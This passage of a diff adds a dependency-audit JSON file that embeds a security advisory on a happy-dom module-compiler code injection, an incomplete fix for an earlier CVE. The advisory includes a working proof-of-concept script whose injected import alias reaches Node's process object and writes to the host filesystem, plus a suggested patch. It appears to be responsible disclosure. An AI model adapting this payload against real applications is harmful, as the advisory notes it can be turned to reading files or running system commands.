globalThis.constructor.constructor(`return process`)().cwd() +\n      `/HAPPY_DOM_RCE_PROOF`\n  )\n```\n\n## Proof of concept\n\nThe following PoC uses only the public Happy DOM API and performs a harmless filesystem action by creating a directory named `HAPPY_DOM_RCE_PROOF`.\n\n### 1. Create `package.json`\n\n```json\n{\n  \"name\": \"happy-dom-import-alias-rce-poc\",\n  \"private\": true,\n  \"type\": \"module\",\n  \"dependencies\": {\n    \"happy-dom\": \"20.14.5\"\n  }\n}\n```\n\n### 2. Create `dep.json`\n\n```json\n{}\n```\n\n### 3. Create `payload.mjs`\n\nThis file is used as a control to demonstrate that a native ECMAScript parser rejects the source:\n\n```js\nimport {\n  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337\n} from './dep.json' with { type: 'json' };\n```\n\n### 4. Create `poc.mjs`\n\n```js\nimport { Window } from 'happy-dom';\nimport { existsSync, rmSync } from 'node:fs';\nimport { resolve } from 'node:path';\n\nconst proofDirectory = resolve('HAPPY_DOM_RCE_PROOF');\nrmSync(proofDirectory, { recursive: true, force: true });\n\nconst window = new Window({\n  url: 'https://poc.local/',\n  settings: {\n    enableJavaScriptEvaluation: true,\n    suppressCodeGenerationFromStringsWarning: true,\n    fetch: {\n      virtualServers: [\n        {\n          url: 'https://poc.local/',\n          directory: process.cwd()\n        }\n      ]\n    }\n  }\n});\n\nconst script = window.document.createElement('script');\nscript.type = 'module';\n\nscript.textContent = `\n  import {\n    missing as injected = globalThis.constructor.constructor(\\`return process\\`)()\n      .getBuiltinModule(\\`node:fs\\`)\n      .mkdirSync(\n        globalThis.constructor.constructor(\\`return process\\`)().cwd() +\n        \\`/HAPPY_DOM_RCE_PROOF\\`\n      )\n  } from './dep.json' with { type: 'json' };\n`;\n\nwindow.document.body.appendChild(script);\nawait window.happyDOM.waitUntilComplete();\n\nif (!existsSync(proofDirectory)) {\n  console.error('[-] Exploit failed: proof directory was not created.');\n  console.error(\n    window.happyDOM.virtualConsolePrinter.readAsString()\n  );\n  process.exitCode = 1;\n} else {\n  console.log(`[+] Host filesystem reached: ${proofDirectory}`);\n}\n\nawait window.happyDOM.close();\n```\n\n### 5. Run the control test\n\n```console\nnpm install\nnode --check payload.mjs\n```\n\nExpected result:\n\n```text\nSyntaxError: Unexpected token '='\n```\n\nThis confirms that the source is not valid ESM.\n\n### 6. Run the Happy DOM PoC\n\n```console\nnode poc.mjs\n```\n\nExpected result:\n\n```text\n[+] Host filesystem reached: /path/to/HAPPY_DOM_RCE_PROOF\n```\n\nThe existence of `HAPPY_DOM_RCE_PROOF` confirms that the expression injected through the import alias executed and reached the host filesystem.\n\nThe PoC was also verified inside a `node:24-alpine` Docker container, where it created:\n\n```text\n/poc/HAPPY_DOM_RCE_PROOF\n```\n\n## Impact\n\nAn attacker who can supply module source to an application that evaluates JavaScript through Happy DOM can cause syntactically invalid import declarations to be transformed into executable JavaScript.\n\nThis may bypass upstream syntax validation or application assumptions that malformed import clauses will be rejected.\n\nThe demonstrated payload reaches Node.js `process` and built-in modules. It can therefore be adapted to read or modify files, access environment data, or execute operating-system commands with the privileges of the Happy DOM host process.\n\n## Relationship to CVE-2026-33943\n\nCVE-2026-33943 covers expression injection through a local export declaration:\n\n```js\nexport { attacker_expression }\n```\n\nIts fix added identifier validation to the `importName` used by the `export { ... }` handler:\n\n```ts\nif (\n  exportName &&\n  importName &&\n  VALID_VARIABLE_NAME_REGEXP.test(importName)\n) {\n  // ...\n}\n```\n\nThis report uses a different parsing and code-generation path:\n\n```js\nimport { name as malicious_alias } from './module';\n```\n\nThe unvalidated value is the local import `alias`, and the injection occurs in a generated destructuring binding rather than the export assignment patched by CVE-2026-33943.\n\nThe issue remains reproducible in versions released after the CVE-2026-33943 fix, including `20.14.5`.\n\n## Suggested fix\n\nValidate the imported local binding before placing it into code context. The existing `VALID_VARIABLE_NAME_REGEXP` can be reused:\n\n```diff\n- if (alias && name) {\n+ if (alias && name && VALID_VARIABLE_NAME_REGEXP.test(alias)) {\n```\n\nA regression test should compile and execute the malicious import declaration, then verify that the initializer was not evaluated.\n\nThis change was tested locally. The focused `ECMAScriptModuleCompiler` test suite passes with 30 tests, and ESLint reports no errors.\n\nFor additional hardening, generated property keys should use `JSON.stringify()` instead of manual quote interpolation.\n\n## Verification record\n\n- Testing date: 2026-09-17\n- Duplicate check updated: 2026-09-20\n- Platform: Windows 11\n- Node.js: `24.14.1`\n- Latest tested package: `happy-dom@20.14.5`\n- Source tag: `v20.14.5`\n- Source commit: `0d4cdbe7442af49d16b49ddf1acf7cc9684ed318`\n- First confirmed affected version: `17.0.0`\n- Confirmed unaffected version: `16.8.1`\n- Docker environment: Node 24 Alpine\n- No matching public advisory, issue, pull request, commit, or release was found during the duplicate check.",
+      "reported_by": null,
+      "title": "Happy DOM: Incomplete fix for CVE-2026-33943: unsanitized import alias leads to host code execution",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-115895"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "happy-dom",
+      "vulnerable_versions": ">=17.0.0 <=21.0.3",
+      "github_advisory_id": "GHSA-834v-8h66-3h79",
+      "recommendation": "Upgrade to version 21.0.4 or later",
+      "patched_versions": ">=21.0.4",
+      "updated": "2026-10-23T22:06:14.000Z",
+      "cvss": {
+        "score": 8.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-834v-8h66-3h79"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 6,
+      "high": 1,
+      "critical": 0
+    },
+    "dependencies": 570,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 570
+  }
+}
